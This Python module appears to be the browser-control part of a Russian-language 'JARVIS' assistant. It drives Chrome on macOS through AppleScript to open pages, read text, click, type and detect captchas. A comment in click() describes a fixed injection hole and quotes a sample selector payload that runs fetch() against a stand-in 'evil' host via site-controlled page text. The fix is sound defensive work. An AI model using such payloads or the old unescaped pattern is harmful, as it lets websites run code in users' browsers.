import logging
import subprocess
from urllib.parse import quote_plus, urlparse


CHROME_APP = "Google Chrome"


def _run_applescript(script):
    """
    Выполняет AppleScript через macOS osascript.
    """
    try:
        result = subprocess.run(
            [
                "osascript",
                "-e",
                script,
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )

        if result.returncode != 0:
            error = result.stderr.strip()

            logging.error(
                "AppleScript error: %s",
                error,
            )

            return None, error

        return result.stdout.strip(), None

    except Exception as e:

        logging.exception(
            "AppleScript execution failed"
        )

        return None, str(e)


def _site_name(url):

    parsed = urlparse(url)

    hostname = (
        parsed.hostname
        or ""
    ).lower()

    if hostname.startswith("www."):
        hostname = hostname[4:]

    names = {
        "google.com": "Google",
        "google.ru": "Google",
        "youtube.com": "YouTube",
        "github.com": "GitHub",
        "gmail.com": "Gmail",
        "yandex.ru": "Яндекс",
        "vk.com": "VK",
        "telegram.org": "Telegram",
        "web.telegram.org": "Telegram",
        "instagram.com": "Instagram",
        "facebook.com": "Facebook",
        "reddit.com": "Reddit",
        "tiktok.com": "TikTok",
        "amazon.com": "Amazon",
        "wikipedia.org": "Wikipedia",
        "linkedin.com": "LinkedIn",
        "chatgpt.com": "ChatGPT",
        "openai.com": "OpenAI",
        "kinogo.ec": "Kinogo",
    }

    if hostname in names:
        return names[hostname]

    parts = hostname.split(".")

    if len(parts) >= 2:
        return parts[-2].capitalize()

    if hostname:
        return hostname.capitalize()

    return "сайт"


def _escape_applescript(text):

    return (
        str(text)
        .replace("\\", "\\\\")
        .replace('"', '\\"')
    )


def _ensure_chrome():

    script = f'''
tell application "{CHROME_APP}"
    activate
end tell
'''

    _, error = _run_applescript(
        script
    )

    if error:

        return False, error

    return True, None


def open_url(
    url,
    browser="chrome",
):

    parsed = urlparse(url)

    if parsed.scheme not in (
        "http",
        "https",
    ):

        raise ValueError(
            "Разрешены только http/https"
        )

    safe_url = _escape_applescript(
        url
    )

    script = f'''
tell application "{CHROME_APP}"
    activate

    if (count of windows) = 0 then
        make new window
    end if

    set active tab index of front window to 1
    set URL of active tab of front window to "{safe_url}"
end tell
'''

    _, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось открыть сайт: {error}"
        )

    return (
        f"Открываю {_site_name(url)}"
    )


def search(
    query,
    browser="chrome",
):

    url = (
        "https://www.google.com/search?q="
        +
        quote_plus(query)
    )

    return open_url(
        url,
        browser,
    )


def open_tab(
    url="about:blank",
    browser="chrome",
):

    if url == "about:blank":

        script = f'''
tell application "{CHROME_APP}"
    activate

    if (count of windows) = 0 then
        make new window
    end if

    tell front window
        make new tab with properties {{URL:"about:blank"}}
    end tell
end tell
'''

    else:

        parsed = urlparse(url)

        if parsed.scheme not in (
            "http",
            "https",
        ):

            raise ValueError(
                "Разрешены только http/https"
            )

        safe_url = _escape_applescript(
            url
        )

        script = f'''
tell application "{CHROME_APP}"
    activate

    if (count of windows) = 0 then
        make new window
    end if

    tell front window
        make new tab with properties {{URL:"{safe_url}"}}
        set active tab index to (count of tabs)
    end tell
end tell
'''

    _, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось открыть вкладку: {error}"
        )

    if url == "about:blank":

        return (
            "Новая вкладка открыта"
        )

    return (
        f"Открываю {_site_name(url)}"
    )


def close_tab(
    browser="chrome",
):

    script = f'''
tell application "{CHROME_APP}"
    activate

    if (count of windows) = 0 then
        return "Браузер не запущен"
    end if

    if (count of tabs of front window) > 1 then
        close active tab of front window
        return "Вкладка закрыта"
    else
        return "Открыта последняя вкладка"
    end if
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось закрыть вкладку: {error}"
        )

    return result or "Вкладка закрыта"


def switch_tab(
    browser="chrome",
):

    script = f'''
tell application "{CHROME_APP}"
    activate

    if (count of windows) = 0 then
        return "Браузер не запущен"
    end if

    set tabCount to count of tabs of front window

    if tabCount < 2 then
        return "Нет других вкладок"
    end if

    set currentIndex to active tab index of front window

    if currentIndex < tabCount then
        set active tab index of front window to currentIndex + 1
    else
        set active tab index of front window to 1
    end if

    return "Переключил вкладку"
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось переключить вкладку: {error}"
        )

    return result or "Переключил вкладку"


def get_current_page(
    browser="chrome",
):

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return "Браузер не запущен"
    end if

    set currentTab to active tab of front window

    set pageTitle to title of currentTab
    set pageURL to URL of currentTab

    return pageTitle & "|||" & pageURL
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось получить страницу: {error}"
        )

    if not result:

        return "Нет информации о странице"

    try:

        title, url = result.split(
            "|||",
            1,
        )

        return (
            f"Название: {title}\n"
            f"URL: {url}"
        )

    except Exception:

        return result


def read_page(
    browser="chrome",
):

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return ""
    end if

    tell active tab of front window
        return execute javascript "document.body.innerText"
    end tell
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось прочитать страницу: {error}"
        )

    if not result:

        return "Страница не содержит текста"

    return result[:10000]


def click(
    selector,
):
    """Клик по CSS-селектору (безопасное экранирование)."""

    import json

    # Селектор кодируется через json.dumps — так же, как в type_text().
    #
    # Прежний вариант подставлял его в JS одинарными кавычками:
    #   document.querySelector('<селектор>').click()
    # а _escape_applescript() экранирует только обратный слэш и двойную
    # кавычку. Одинарная кавычка внутри селектора закрывала JS-строку,
    # и остаток селектора становился исполняемым кодом в сессии браузера
    # сэра. Селектор приходит из текста страницы (read_page), то есть
    # под контролем любого сайта: селектор вида a'); fetch('//evil/'); //
    # выполнялся как есть. Здесь это невозможно по построению.
    js = (
        "var el = document.querySelector("
        + json.dumps(str(selector))
        + ");"
        # Метка вместо молчаливого «ничего не произошло»: прежний код
        # ронял JS на отсутствующем элементе, и сэр получал невнятную
        # ошибку вместо ответа «элемент не найден».
        "if (!el) { 'JARVIS_NOT_FOUND'; }"
        " else { el.click(); 'JARVIS_OK'; }"
    )

    safe_js = _escape_applescript(
        js
    )

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return "Браузер не запущен"
    end if

    tell active tab of front window
        return execute javascript "{safe_js}"
    end tell
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось выполнить клик: {error}"
        )

    if "Браузер не запущен" in (result or ""):

        # Скрипт не выполнялся вовсе: окна нет, кликнуть не по чему.
        # Раньше сюда подставлялось «Кликнул {selector}» — сэр слышал
        # успех там, где не было даже страницы.
        return (
            "Не удалось кликнуть: браузер не запущен "
            "(нет открытого окна)"
        )

    if "JARVIS_NOT_FOUND" in (result or ""):

        return (
            f"Не нашёл на странице элемент: {selector}"
        )

    return (
        f"Кликнул {selector}"
    )


def type_text(
    selector,
    text,
):
    """Ввод текста в поле через JS (безопасное экранирование)."""

    import json

    # Собираем корректный JS: строки кодируются через JSON,
    # чтобы одинарные/двойные кавычки и backslash не ломали скрипт.
    #
    # Возврат из JS — не пустой: метка говорит, нашлось ли поле и что
    # реально оказалось в нём после ввода. Прежний вариант писал
    # `if (el) {...}` молча: элемента не нашлось — скрипт успешно
    # сделал «ничто», а функция рапортовала «Текст введён». Это
    # худший вид ложного успеха: шаг помечался выполненным, AI
    # говорил сэру «готово», а в поле было пусто. Теперь результат
    # проверяется по факту значения в поле.
    js = (
        "var sel = "
        + json.dumps(str(selector))
        + ";"
        "var el = document.querySelector(sel);"
        "if (!el) { 'JARVIS_NOT_FOUND'; }"
        " else {"
        " el.focus();"
        " el.value = "
        + json.dumps(str(text))
        + ";"
        # Controlled-поля (React/Vue) требуют событий input/change
        " el.dispatchEvent(new Event('input', {bubbles: true}));"
        " el.dispatchEvent(new Event('change', {bubbles: true}));"
        # Проверяем результат, а не сам факт присваивания:
        # у поля может быть maxlength или ограничитель — тогда
        # значение обрежется, и сэр должен узнать об этом.
        " (el.value === "
        + json.dumps(str(text))
        + ") ? 'JARVIS_OK' : 'JARVIS_TRUNCATED';"
        "}"
    )

    safe_js = _escape_applescript(
        js
    )

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return "Браузер не запущен"
    end if

    tell active tab of front window
        return execute javascript "{safe_js}"
    end tell
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Не удалось ввести текст: {error}"
        )

    outcome = (result or "").strip()

    if "Браузер не запущен" in outcome:

        # Как и в click(): окна нет, ввода не было. Раньше дальше
        # стояло «Текст введён» — ложный успех на незапущенном браузере.
        return (
            "Не удалось ввести текст: браузер не запущен "
            "(нет открытого окна)"
        )

    if "JARVIS_NOT_FOUND" in outcome:

        return (
            f"Не нашёл на странице поле: {selector}"
        )

    if "JARVIS_TRUNCATED" in outcome:

        # Поле приняло не всё: ввод обрезан. Это должно звучать как
        # проблема, а не как «готово» — иначе сэр отправит не то.
        logging.warning(
            "Поле ввода приняло не весь текст (selector=%s)", selector,
        )
        return (
            f"Поле «{selector}» приняло не весь текст — "
            "проверьте, всё ли введено"
        )

    return "Текст введён"


def find_text(
    text,
):
    """Ищет текст на открытой странице.

    Проверка раньше стояла ПОСЛЕ `end tell`, где `pageText` уже вне
    области видимости: AppleScript не знает эту переменную и роняет
    скрипт, поэтому поиск всегда возвращал ошибку. Теперь сравнение
    внутри того же блока, где переменная объявлена.
    """

    safe_text = _escape_applescript(
        text
    )

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return "Нет страницы"
    end if

    tell active tab of front window
        set pageText to execute javascript "document.body.innerText"
        if pageText contains "{safe_text}" then
            return "Найдено: 1"
        else
            return "Найдено: 0"
        end if
    end tell
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return (
            f"Ошибка поиска: {error}"
        )

    return result or "Найдено: 0"


def get_links():

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return ""
    end if

    tell active tab of front window
        return execute javascript "Array.from(document.querySelectorAll('a')).slice(0,50).map(a => a.href).join('\\\\n')"
    end tell
end tell
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return []

    if not result:

        return []

    return result.splitlines()


def check_captcha():

    script = f'''
tell application "{CHROME_APP}"
    if (count of windows) = 0 then
        return "false"
    end if

    tell active tab of front window
        set pageText to execute javascript "document.body.innerText.toLowerCase()"
    end tell
end tell

set captchaWords to {{"captcha", "cloudflare", "verify", "проверка", "я не робот"}}

repeat with wordItem in captchaWords
    if pageText contains wordItem then
        return "true"
    end if
end repeat

return "false"
'''

    result, error = _run_applescript(
        script
    )

    if error:

        return False

    return result == "true"


def kinogo_search(
    movie,
):

    # WordPress-поиск Kinogo: /?s=<запрос>
    query = quote_plus(
        str(movie)
    )

    open_url(
        f"https://kinogo.ec/?s={query}"
    )

    if check_captcha():

        return (
            "Kinogo ждёт проверку. Пройди её вручную."
        )

    return (
        f"Открыл поиск Kinogo по запросу: {movie}"
    )